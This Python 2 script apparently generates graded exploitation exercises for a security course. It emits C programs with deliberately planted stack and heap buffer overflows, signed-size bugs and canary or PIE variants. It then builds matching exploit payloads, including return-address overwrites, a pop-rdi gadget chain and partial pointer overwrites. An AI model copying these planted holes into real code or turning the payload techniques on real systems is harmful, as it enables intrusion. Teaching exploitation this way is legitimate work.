#pylint:disable=unused-import

import subprocess
import random
import string
import struct
import shutil
import time
import tqdm
import os

challenge_header = r"""
#include <sys/sendfile.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <assert.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>

void win(int);
int vuln(int, char**, char**);

int asdf()
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
		"push rdi;"
		"pop rdi;"
		"ret;"
        ".att_syntax;"
		:
		:
		:
	);
	exit(0);
}

int main(int argc, char **argv, char **envp)
{
	puts("===================================================");
	printf("\tWelcome to %s!\n", argv[0]);
	puts("===================================================");
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 1);

	return vuln(argc, argv, envp);
}

int vuln(int argc, char **argv, char **envp)
{

"""
challenge_footer = """
	puts("Goodbye!");
	return 0;
}
"""
canary_setter = """
__attribute__((constructor)) void set_canary()
{  
	puts("Hardcoding canary to simulate long-running process (or Android).");
	char canary_str[17] = {0};
	int canary_fd = open("/flag", 0);
	read(canary_fd, canary_str, 7);
	read(canary_fd, canary_str, 16);
    uint64_t new_canary = strtoull(canary_str, NULL, 16);
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "mov rax, %0;"
        "mov QWORD PTR fs:0x28, rax;"
        ".att_syntax;"
        :
        : "r"(new_canary)
        : "%rax"
    );
    return;
}
"""

#
# ideas:
#

def escape_string(s):
	h = s.encode('hex').lower()
	return '\\x'+'\\x'.join(h[i:i+2] for i in range(0, len(h), 2))

levels = [
	# level 0: not PIE, overflow into two variables at different offsets to satisfy a condition to win
	lambda r: Challenge(local_win=True, canary=True, random_seed=r),
	# level 1: add a signed size check
	lambda r: Challenge(local_win=True, size_check=True, signed_size=True, canary=True, random_seed=r),
	# level 2: remove the condition (overflow to win function)
	lambda r: Challenge(size_check=True, signed_size=True, random_seed=r),
	# level 6: win function takes an argument, another function pops rdi
	lambda r: Challenge(size_check=True, signed_size=True, picky_win=True, random_seed=r),
	# level 3: make the binary PIE (no leak!)
	lambda r: Challenge(pie=True, random_seed=r),
	# level 4: add a constant canary (no leak)
	lambda r: Challenge(pie=True, canary=True, override_canary=True, random_seed=r),
	# level 5: add a variable canary (jump it)
	lambda r: Challenge(pie=True, canary=True, incremental_read=True, random_seed=r),
	# level 5: canary and everything, but flag in env
	lambda r: Challenge(pie=True, canary=True, env_flag=True, random_seed=r),
	# level 6: PIE, win function takes an argument, another function pops rdi
	lambda r: Challenge(echo_input=True, input_twice=True, picky_win=True, pie=True, canary=False, random_seed=r),
	# level 7: no canary bypass, argv corruption to leak data with abort()
	lambda r: Challenge(canary=True, env_flag=True, pie=True, random_seed=r),
	# level 8: heap overflow
	lambda r: Challenge(on_heap=True, local_win=True, pie=True, random_seed=r),
]

class Challenge(object):
	def __init__(self, on_heap=False, env_flag=False, echo_input=False, input_twice=False, picky_win=False, incremental_read=False, pie=False, local_win=False, size_check=False, signed_size=False, override_canary=False, canary=False, random_seed=0):
		self._random_seed = random_seed
		self._random = random.Random(self._random_seed)

		self._local_win = local_win
		self._size_check = size_check
		self._signed_size = signed_size
		self._override_canary = override_canary
		self._canary = canary
		self._pie = pie
		self._picky_win = picky_win
		self._echo_input = echo_input
		self._input_twice = input_twice
		self._env_flag = env_flag
		self._on_heap = on_heap
		self._incremental_read = incremental_read
		self._chal_path = None

		self._buffer_size = self._random.randrange(8, 1016, 16)
		self._some_offsets = [ self._random.randrange(1, 4) for _ in range(8) ]
		self._some_bytes = [ self._random.randint(0, 255) for _ in range(8) ]

	def __repr__(self):
		return """Challenge(
	random_seed=%d
)""" % (self._random_seed)

	def _process(self):
		cmd = [ self._chal_path ]
		p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env={})
		return p

	def _find_crashing_prefix(self, known=""):
		# first, find the next crashword
		payload = known
		while True:
			next_char = os.urandom(1)
			for _ in range(2):
				process = self._process()
				process.communicate(payload+next_char)
				process.wait()
				if process.returncode != 0:
					break
			else:
				payload += "A"
			break

		print "First crash after %d chars" % len(payload)

	def test(self, right=None):
		chal_name = self._chal_path
		if right is None:
			assert all(self.test(right=False) for _ in range(1))
			assert any(self.test(right=True) for _ in range(16))
			return True

		print "Testing %r right=%s" % (self, right)

		#shutil.rmtree("/tmp/test")
		#os.makedirs('/tmp/test')
		#self.compile(chal_name)

		print "Launching process!"
		p = self._process()

		if right:
			payload = self._get_payload(chal_name)
		else:
			payload = "nope"
		print "Communicating!"
		stdout, _ = p.communicate(payload)
		print "#####"
		print stdout
		print "#####"

		#
		# clean up
		#
		return ("CSE466" in stdout) if right else ("CSE466" not in stdout)

	def _get_payload(self, path):
		p = ""
		if self._size_check and not self._signed_size:
			p += "%d\n"%(self._buffer_size + 8)
		else:
			p += "-1\n"

		win_addr = next(int(s.split()[0], 16) for s in subprocess.Popen(["nm", path], stdout=subprocess.PIPE).communicate()[0].split('\n') if 'win' in s)
		asdf_addr = next(int(s.split()[0], 16) for s in subprocess.Popen(["nm", path], stdout=subprocess.PIPE).communicate()[0].split('\n') if 'asdf' in s)

		if not self._pie and not self._on_heap and self._local_win:
			p += "A"*(self._buffer_size+8) + "".join("B"*p + chr(b) for p,b in zip(self._some_offsets, self._some_bytes))
		elif not self._pie and not self._local_win and not self._on_heap and not self._canary and not self._picky_win:
			p += struct.pack("<Q", win_addr) * 1024
		elif not self._pie and not self._local_win and not self._on_heap and not self._canary:
			p += ("A"*8)*random.randint(0,3) + (struct.pack("<Q", asdf_addr+5) + struct.pack("<Q", 0x1337) + struct.pack("<Q", win_addr)) * 128
		elif self._pie and not self._canary and not self._on_heap and not self._local_win:
			of = "A"*(self._buffer_size+8) + struct.pack("<Q", win_addr)[:2]
			print hex(self._buffer_size), hex(len(of))
			p += of

		return p

	def compile(self, filename):
		with open(filename+'.c', 'w') as o:
			o.write(self.emit())
		gcc_options = "-fomit-frame-pointer "
		if not self._pie:
			gcc_options += "-no-pie "
		if not self._canary:
			gcc_options += "-fno-stack-protector "

		assert os.system('gcc -O0 %s -Wno-incompatible-pointer-types -Wno-unused-result %s.c -o %s' % (gcc_options, filename, filename)) == 0
		self._chal_path = filename

	def emit(self):
		code = challenge_header

		# allocate the input
		win_struct = "volatile struct {" + ' '.join("unsigned char p%d[%d]; unsigned char b%d;"%(i,self._some_offsets[i],i) for i in range(8)) + "} __attribute__((packed)) "
		if not self._on_heap:
			code += "\tstruct { char input[%d]; uint64_t n; " % (self._buffer_size)
			if self._local_win:
				code += win_struct + "wincheck; "
			code += "} frame;\n"
			code += "\tuint64_t *n = &frame.n;\n"
			code += "\tchar *input = (char *)&frame.input;\n"
			if self._local_win:
				code += "\t" + win_struct + "*win_check = &frame.wincheck;\n"
				#code += """\tread(open("wtf", 0), &frame, sizeof(frame));"""
		else:
			assert self._local_win
			code += "\tchar *input = malloc(%d);\n" % (self._buffer_size+8)
			code += "\tuint64_t *n = (uint64_t *)(input+%d);\n" % self._buffer_size
			code += "\t" + win_struct + "*win_check = malloc(%d);\n" % 40
			#code += """\tread(open("wtf", 0), &win_check, sizeof(%s));""" % win_struct

		if self._env_flag:
			code += """
	puts("Reading the flag into memory for you...");
	int flag_fd = open("/flag", 0);
	strcpy(envp[0], "FLAG=");
	envp[0][5+read(flag_fd, envp[0]+5, 1024)] = 0;
"""

		if self._signed_size:
			code += """
	short size;
	printf("Payload size? ");
	scanf("%hi", &size);
"""
		else:
			code += """
	unsigned short size;
	printf("Payload size? ");
	scanf("%hu", &size);
"""

		if self._size_check:
			code += "\tassert(size <= %d);\n" % (self._buffer_size + 8)

		code += """\tprintf("Send your payload (up to %d bytes)!\\n", size);\n"""
		if not self._incremental_read:
			code += "\tread(0, input, (unsigned short)size);\n"
		else:
			code += "\twhile (*n < size) n += read(0, input, 1);\n"

		if self._echo_input:
			code += """\tprintf("Your first payload was: %s\\n", input);\n"""

		if self._input_twice:
			code += """puts("Send your second payload!");"""
			if not self._incremental_read:
				code += "\tread(0, input, size);\n"
			else:
				code += "\t*n = 0; while (*n < size) n += read(0, input, 1);\n"

		if self._local_win:
			code += "puts(win_check);"
			code += "\tif (" + " && ".join('win_check->b%d == %d' % (n,b) for n,b in enumerate(self._some_bytes)) + ") win(0x1337);\n"
			code += """\telse puts("You lose!");\n"""

		code += challenge_footer
		code += """
void win(int win_token)
{
"""
		if self._picky_win:
			code += "\tassert(win_token == 0x1337);"
		code += """
	puts("You win! Here is your flag:");
	register int flag_fd = open("/flag", 0);
	sendfile(1, flag_fd, 0, 1024);
}
"""

		if self._override_canary:
			code += canary_setter
		return code

SYSTEMS = sorted([ 'linux', 'windows', 'ios', 'macos', 'android', 'dos', 'beos', 'cpm', 'freebsd', 'netbsd', "openbsd" ])
WORDS = [ w.strip().lower() for w in open(os.path.join(os.path.dirname(__file__), 'words')).readlines() if set(w.strip().lower()).issubset(string.lowercase) and len(w.strip()) > 6 ]
assert len(SYSTEMS) >= len(levels)
def create(dirname):
	# 6 total input types
	# 11 difficulty levels
	# 2 per type per level
	#for _u in tqdm.tqdm(range(200)):
	for _u in [ 0 ]:
		#for _d,_l in list(enumerate(levels))[3:]:
		for _d,_l in enumerate(levels):
			_s_start = 100000*_u + 1000*_d
			_s_end = _s_start + 3
			for _s in range(_s_start, _s_end):
				try: os.makedirs(os.path.join(dirname, str(_u)))
				except OSError: pass
				_chal_name = "%s_%s" % (SYSTEMS[_d], WORDS[_s%len(WORDS)])
				print _u,_d,_chal_name,_s
				c = _l(_s)
				c.compile(os.path.join(dirname, str(_u), _chal_name))
				c.test()

if __name__ == '__main__':
	create('challenges')
